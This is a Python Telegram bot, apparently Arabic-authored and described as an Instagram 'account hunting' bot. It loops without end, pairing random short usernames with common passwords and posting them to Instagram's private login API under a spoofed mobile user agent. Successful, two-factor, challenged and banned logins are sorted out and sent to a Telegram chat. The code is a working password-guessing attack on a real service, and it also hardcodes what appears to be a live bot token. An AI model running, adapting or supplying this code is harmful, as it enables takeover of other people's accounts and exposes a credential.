import requests
import time
import random
import telebot
from uuid import uuid4
#from os import system as cmd
from telebot import types

token = "5430601726:AAHMiFsYuGkht5gYqWTWdkQzUpn3A4FDzdM"
bot = telebot.TeleBot(token)
@bot.message_handler(commands=['start'])


def start(message):
    START = types.InlineKeyboardButton(text =" START BOT ", callback_data = 'START')
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 1
    maac.add(START)
    bot.send_message(message.chat.id,text=f"*مرحبا بك في بوت صيد الحسابات انستجرام \nمبرمج البوت @MVMVP - @W_Y67*",parse_mode="markdown",reply_markup=maac)
@bot.callback_query_handler(func=lambda call: True)
def clase(call):
	if call.data=='START':
		ran = types.InlineKeyboardButton(text =" بدء الصيد 🏹 ", callback_data = 'ran')
		maac1 = types.InlineKeyboardMarkup()
		maac1.row_width = 2
		maac1.add(ran)
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"* مرحبا بك في بوت صيد الحسابات\nBy :@MVMVP*",parse_mode="markdown",reply_markup=maac1)
	elif call.data =="ran":
			message = call.message
		
		
		
		#sid =(message.text)
		#message = message
			
			url = 'https://b.i.instagram.com/api/v1/accounts/login/'
			user = 'qwertyuioplkjhgfdsazxcvbnm1234567890_.'
			pas =['qwer1234qwer','p09988','520520','778899','123456789000']
			sk=0
			br=0
			gm=0
			ya=0
			er =0
			ti=0
						
				
			while True:
							
							
					username = str(''.join(random.choice(user)for i in range(4))).lower()
							
					password = random.choice(pas)
							#us = 
					headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
					uid = str(uuid4())#الوقت اليوم لكن في الاعداد العشرية
					data = {
			'uuid':uid, 
			'password':f'{password}', 
			'username':f'{username}',
			'device_id':uid, 
			'from_reg':'false', 
			'_csrftoken':'missing', 
			'login_attempt_countn':'0'
			}
					rq= requests.post(url,headers=headers,data=data).text
					bot.send_message(message.chat.id,f"{rq}")
					
				
					
					
					if ("use Instagram because your account didn't follow our Community Guidelines. This decision can't be reversed either because we've already reviewed it, or because 30 days have passed since your account was disabled.") in rq:
					
						gm+=1
						bot.send_message(message.chat.id,f" Band : \nUsername : {username}\nPassword : {password}\nBy : @MVMVP")
						
					if ('"two_factor_required"') in rq:
	
						ya+=1
						bot.send_message(message.chat.id,f" Number User :\nUsername : {username}\nPassword :  {password}\nBy : @MVMVP")
						
							
							    
							    
					if ('"logged_in_user"') in rq:
						br+=1
						bot.send_message(message.chat.id,f" Hit :\nUsername : {username}\nPassword : {password}\nBy : @MVMVP")
						#co = rq.cookies
#						coo =co.get_dict()
#						tok = coo['sessionid']#لستخراج التوكن قم بكتابة print(tok
#						cookiee = f"sessionid={coo['sessionid']};ds_user_id={coo['ds_user_id']};csrftoken={coo['csrftoken']}"
						
								
					if ('"challenge_required"') in rq:
						sk+=1
						bot.send_message(message.chat.id,f" Scuer\nUser : {username}\nPassword : {password}\nBy : @MVMVP - @W_Y67")
					if ('"Please wait a few minutes before you try again."') in rq:
						ti+=1
						
						#سكيور 
							#كلمة المرور خطأ او الحساب
					else:
						er+=1
						aac = types.InlineKeyboardMarkup()
						aac.row_width = 2
						i1 = types.InlineKeyboardButton(text =f"No Password 📍: {er} ", callback_data = 'c')
						i2 = types.InlineKeyboardButton(text =f"Hit ✅ : {br}", callback_data = 'c')
						i3 = types.InlineKeyboardButton(text =f"Scueer 📍: {sk} ", callback_data = 'c')
						i4 = types.InlineKeyboardButton(text =f"Band ✅: {gm} ", callback_data = 'c')
						i5 = types.InlineKeyboardButton(text =f"Number User 📍: {ya} ", callback_data = 'c')
						i55 = types.InlineKeyboardButton(text =f"Time 🕚: {ti} ", callback_data = 'c')
						
						i13= types.InlineKeyboardButton(text =f" 👉 {username}  : {password} 👈", callback_data = 'c')
						aac.add(i1,i2,i3,i4,i5,i13,i55)
						bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="جار الفحص",parse_mode="markdown",reply_markup=aac)
						
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
	       print(e)
	       time.sleep(3)
				
			
				
